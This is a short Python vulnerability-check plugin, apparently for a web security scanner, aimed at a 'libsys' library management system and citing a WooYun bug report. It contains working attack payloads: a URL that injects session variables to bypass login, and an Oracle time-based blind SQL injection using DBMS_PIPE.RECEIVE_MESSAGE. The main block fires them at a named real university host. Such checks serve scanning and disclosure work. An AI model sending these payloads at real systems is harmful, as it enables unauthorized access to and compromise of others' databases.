#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2016-0173952

import time

def assign(service, arg):
    if service == "libsys":
        return True, arg

def audit(arg):
    payload = 'recm/?_SESSION[RECMSYS_SESSION_WKR]=wkr'
    code, head, res, err, _ = curl.curl2(arg+payload)
    if code ==200 and 'logout.php' in res:
        security_hole(arg+payload+"  :Log bypass")
    payload1 = 'recm/browsexk_detl.php?clc=fav&_SESSION[RECMSYS_SESSION_WKR]=%27wkr%27&_SESSION[RECMSYS_WKR_DEFAULT_PARA][FAV_DISCIPLINE]=123)%20AND%205854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(89)||CHR(83)||CHR(65),0)--'
    payload2 = 'recm/browsexk_detl.php?clc=fav&_SESSION[RECMSYS_SESSION_WKR]=%27wkr%27&_SESSION[RECMSYS_WKR_DEFAULT_PARA][FAV_DISCIPLINE]=123)%20AND%205854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(89)||CHR(83)||CHR(65),5)--'
    t1 = time.time()
    code1, head, res, err, _ = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head, res, err, _ = curl.curl2(arg+payload2)
    t3 = time.time()
    if code1 == 200 and code2 == 200 and t3 - 2*t2+t1 > 3:
        security_hole(arg+payload1+"  :sql Injection")
           
if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys', 'http://libhw.jsnu.edu.cn:8080/')[1])
    